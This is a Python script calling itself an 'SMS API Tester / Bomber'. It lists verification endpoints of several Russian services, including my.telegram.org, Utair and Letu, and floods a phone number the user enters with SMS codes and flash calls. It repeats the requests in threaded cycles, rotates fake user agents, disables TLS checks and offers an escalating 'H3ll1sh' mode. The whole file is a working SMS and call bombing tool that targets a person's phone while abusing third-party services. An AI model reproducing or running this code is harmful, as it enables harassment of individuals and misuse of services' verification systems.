#!/home/arch/sms-tester/venv/bin/python
import requests
import time
import random
import threading
from concurrent.futures import ThreadPoolExecutor
from fake_useragent import UserAgent

ua = UserAgent()

def generate_email():
    templates = [
        f'{random.randint(1,9999)}qwerty{random.randint(1,9999)}poplok{random.randint(1,9999)}',
        f'asd{random.randint(1,9999)}vdiu{random.randint(1,9999)}gv{random.randint(1,9999)}uhn',
        f'{random.randint(1,9999)}rftfg{random.randint(1,9999)}xcvm{random.randint(1,9999)}7pwgs'
    ]
    return f'{random.choice(templates)}@gmail.com'

APIS = [
    {
        "name": "Letu (L'Occitane)", 
        "url": "https://www.letu.ru/s/api/user/account/v1/confirmations/phone",
        "pre_url": "https://www.letu.ru/",
        "payload": {"phoneNumber": "+{phone}"}, "formate": False,
        "origin": "https://www.letu.ru", "referer": "https://www.letu.ru/",
        "params": {"pushSite": "storeMobileRU"}
    },
    {
        "name": "My.Telegram.org", 
        "url": "https://my.telegram.org/auth/send_password",
        "pre_url": "https://my.telegram.org/",
        "payload": {"phone": "+{phone}"}, "formate": True,
        "origin": "https://my.telegram.org", "referer": "https://my.telegram.org/"
    },
    {
        "name": "Utair (Session)", 
        "url": "https://b.utair.ru/api/v1/login/",
        "pre_url": "https://www.utair.ru/",
        "payload": {"login": "{phone}", "confirmation_type": "standart"}, "formate": True,
        "origin": "https://www.utair.ru", "referer": "https://www.utair.ru/"
    },
    {
        "name": "TortoMaster (Call)", 
        "url": "https://kaliningrad.tortomaster.ru/include/ajax/flashcall_helper.php",
        "pre_url": "https://kaliningrad.tortomaster.ru/personal/?register=yes",
        "payload": {"REGISTER[PHONE_NUMBER]": "{phone}", "send_sms": "Y", "agree": "Y"}, "formate": True,
        "origin": "https://kaliningrad.tortomaster.ru", "referer": "https://kaliningrad.tortomaster.ru/personal/?register=yes"
    },
    {
        "name": "VTK-Moscow", 
        "url": "https://vtk-moscow.ru/users/",
        "pre_url": "https://vtk-moscow.ru/",
        "payload": {"from_phone": "{phone}", "apply": "reg_apply"}, "formate": True,
        "origin": "https://vtk-moscow.ru", "referer": "https://vtk-moscow.ru/"
    },
    {
        "name": "Azbuka-Severa (Call)", 
        "url": "https://azbuka-severa.ru/local/ajax/get_phone_code.php",
        "pre_url": "https://azbuka-severa.ru/",
        "payload": {"PHONE": "{phone}"}, "formate": True,
        "origin": "https://azbuka-severa.ru", "referer": "https://azbuka-severa.ru/"
    }
]

def send_request(api, phone):
    try:
        session = requests.Session()
        headers = {
            "User-Agent": ua.random,
            "Accept": "application/json, text/plain, */*",
            "Origin": api.get("origin", ""),
            "Referer": api.get("referer", "")
        }
        session.headers.update(headers)

        if api.get("pre_url"):
            session.get(api["pre_url"], timeout=10, verify=False)

        payload = {}
        for k, v in api["payload"].items():
            payload[k] = v.replace("{phone}", phone) if isinstance(v, str) else v

        if api.get("formate"):
            r = session.post(api["url"], data=payload, params=api.get("params"), timeout=10, verify=False)
        else:
            r = session.post(api["url"], json=payload, params=api.get("params"), timeout=10, verify=False)

        if r.status_code in [200, 201, 202, 204]:
            print(f"  [+] OK: {api['name']} ({r.status_code})")
        else:
            print(f"  [-] FAIL: {api['name']} ({r.status_code})")
            
    except Exception as e:
        print(f"  [!] ERR: {api['name']} - {type(e).__name__}")

def run_mode(mode, phone, cycles):
    if mode == "1":
        target_apis = [a for a in APIS if "Call" not in a["name"]]
    elif mode == "2":
        target_apis = [a for a in APIS if "Call" in a["name"]]
    elif mode == "3":
        target_apis = APIS
    elif mode == "4":
        target_apis = APIS

    print(f"\n[*] Starting mode {mode} for {phone}")
    print(f"[*] Cycles: {cycles}. Total APIs: {len(target_apis)}\n")

    for i in range(cycles):
        print(f"--- Cycle {i+1} ---")
        with ThreadPoolExecutor(max_workers=10) as executor:
            for api in target_apis:
                executor.submit(send_request, api, phone)
        time.sleep(3)

def main():
    ascii_art = """
    ██╗  ██╗███████╗██╗     ██╗     ███████╗██╗██████╗ ███████╗
    ██║  ██║██╔════╝██║     ██║     ██╔════╝██║██╔══██╗██╔════╝
    ███████║█████╗  ██║     ██║     █████╗  ██║██████╔╝█████╗  
    ██╔══██║██╔══╝  ██║     ██║     ██╔══╝  ██║██╔══██╗██╔══╝  
    ██║  ██║███████╗███████╗███████╗██║     ██║██║  ██║███████╗
    ╚═╝  ╚═╝╚══════╝╚══════╝╚══════╝╚═╝     ╚═╝╚═╝  ╚═╝╚══════╝
    [ SMS API Tester / Bomber ]
    """
    print(ascii_art)
    print("Select mode:")
    print("  1. SMS")
    print("  2. CALL")
    print("  3. Mixer")
    print("  4. H3ll1sh")
    print("  0. Exit\n")
    
    mode = input("> ")
    if mode == "0":
        return
        
    if mode not in ["1", "2", "3", "4"]:
        print("Invalid mode!")
        return

    phone = input("Enter phone number (example: 79991234567): ").strip()
    phone = "".join(filter(str.isdigit, phone))
    
    if len(phone) != 11:
        print("[!] Phone number must have 11 digits!")
        return

    try:
        cycles = int(input("Enter cycles: "))
    except ValueError:
        print("[!] Please enter a valid number!")
        return

    try:
        run_mode(mode, phone, cycles)
    except KeyboardInterrupt:
        print("\n[*] Stopped by user.")

if __name__ == "__main__":
    main()
